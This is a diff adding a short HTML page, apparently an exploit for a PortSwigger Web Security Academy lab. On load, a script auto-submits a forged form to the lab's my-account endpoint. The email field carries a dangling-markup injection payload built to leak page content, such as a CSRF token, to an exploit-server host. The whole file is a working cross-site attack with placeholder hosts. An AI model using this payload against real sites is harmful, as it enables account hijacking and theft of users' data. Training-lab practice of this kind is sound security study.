@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Nice Web</title>
+  </head>
+  <body>
+    <h1>Hello World!</h1>
+    <script>
+    let form = document.createElement('form');
+    form.action='https://YOUR-LAB-ID.web-security-academy.net/my-account';
+    let input = document.createElement('input');
+    input.name = 'email';
+    input.value = '"><table background=\'//YOUR-EXPLOIT-SERVER-ID.web-security-academy.net?';
+    form.append(input);
+    document.body.appendChild(form);
+    form.submit()
+</script>
+  </body>
+</html>
